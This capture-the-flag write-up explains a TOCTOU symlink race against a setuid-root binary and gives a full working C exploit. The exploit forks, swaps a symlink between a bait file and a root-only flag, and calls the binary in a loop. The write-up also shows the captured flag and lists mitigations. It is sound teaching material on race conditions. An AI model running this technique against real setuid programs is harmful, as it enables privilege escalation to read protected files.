# I challenge you for a race

## The vulnerability: TOCTOU (Time-Of-Check to Time-Of-Use)

The `challenge` binary is **setuid root** (`-rwsr-xr-x root root`), so it runs
with *effective UID* 0 (root) while the *real UID* stays that of our user. The
program reads a filename from stdin and does, in essence:

1. `access(file, R_OK)` — the permission check is performed with the **real UID**
   (ours), to make sure the user who invoked the program would be allowed to read
   that file.
2. If the check passes, it opens and prints the file — and that `open`/`fopen` is
   performed with the **effective UID** (root).

The flag lives in `/challenge/flag` with permissions `-rw-r----- root root`, i.e.
only root can read it. If we pass the flag's path directly, `access` runs with
our real UID and fails immediately.

The problem is that the **check** (`access`) and the **use** (`open`) are not
atomic and operate on a path **we control**. There is a time window between the
two moments. If we make that path mean one thing at the instant of `access` and
another at the instant of `open`, we bypass the check.

## The exploitation

We do not have read permission on the flag, but we do on files we create in
`/tmp`. The idea:

1. Create a **bait** file (`bait.txt`) in `/tmp`, which we can read, and a
   **symbolic link** pointing to it.
2. Pass the link's name to `challenge`.
3. Run the **race**: continuously swap the link's target between the bait and the
   flag, while invoking `challenge` repeatedly.

When `access` reads the link at the instant it points to the bait, the check
passes (we have permission on the bait). If, right afterwards, `open` runs with
the link already pointing to the flag, the privileged read (as root) dumps the
flag's contents.

We implemented this in C using `fork()` to get two flows running in parallel:

- **Child process** — infinite loop that alternates the link's target between the
  bait and the flag. Each `symlink` is preceded by an `unlink`, because `symlink`
  fails if the link name already exists.
- **Parent process** — infinite loop that invokes `challenge`, passing the link's
  name as input (`echo bait_flag | /challenge/challenge`).

### The exploit

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

int main(){

    pid_t pid = fork();

    char *bait_flag = "bait_flag";
    char *destino_isca = "/tmp/gustavoraceconditions/bait.txt";
    char *destino_flag = "/challenge/flag";

    symlink(destino_isca, bait_flag); // create the initial link

    if(pid < 0){
        perror("Erro no fork");
    }
    else if(pid == 0){ // child process: alternate the link's target
        while(1){
            unlink(bait_flag);
            symlink(destino_isca, bait_flag); // link -> bait
            unlink(bait_flag);
            symlink(destino_flag, bait_flag); // link -> flag
        }
    } else { // parent process: invoke the challenge in a loop
        while(1){
            system("echo bait_flag | /challenge/challenge");
        }
    }

    return 0;
}
```

Because the swap is **non-atomic** (`unlink` followed by `symlink`), there is a
brief instant where the link points to nothing, and in those attempts `access`
fails with `ENOENT` and they are wasted. Even so, with enough iterations the
timing eventually coincides: `access` catches the bait and `open` catches the
flag.

## Getting the flag

When running the exploit, the terminal floods with output (the program's prompt,
the "No permission" errors, and the bait's contents). Filtering out the known
noise, the flag shows up on its own:

```
SSof{This_is_a_to(u)c_tuc_race}
```

## Mitigation

The root cause is checking the permission with one identity and using the file
with another, over a path the attacker controls. Ways to fix `read_file.c`:

- **Do not use `access`.** `access` exists precisely for this setuid pattern, and
  it is inherently vulnerable to TOCTOU. Instead of checking and then opening, one
  should temporarily drop privileges and let `open` itself perform the permission
  check with the real UID: `seteuid(getuid())` before the `open` and, if needed,
  restore the effective UID afterwards. That way the check and the use share the
  same identity and the same act (the `open`), removing the window.
- **Validate the already-open file, not the path.** Open with `O_NOFOLLOW` (to
  refuse symlinks) and/or validate the file descriptor already obtained with
  `fstat`, instead of trusting the path, which can be swapped between the check
  and the use.
- **Remove setuid if it is not needed.** A binary should not run with root
  privileges if it does not require them.